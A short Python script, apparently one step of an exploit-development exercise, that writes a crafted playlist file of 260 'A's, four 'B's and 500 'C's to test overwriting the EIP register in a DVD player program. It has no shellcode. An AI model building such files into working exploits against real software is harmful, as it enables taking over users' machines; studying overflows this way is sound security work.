#!/usr/bin/python

file = open("dvd_eip_b_overwrite.plf", "wb")

buffer = "A"*260
buffer += "B"*4
buffer += "C"*500

file.write(buffer)

file.close()
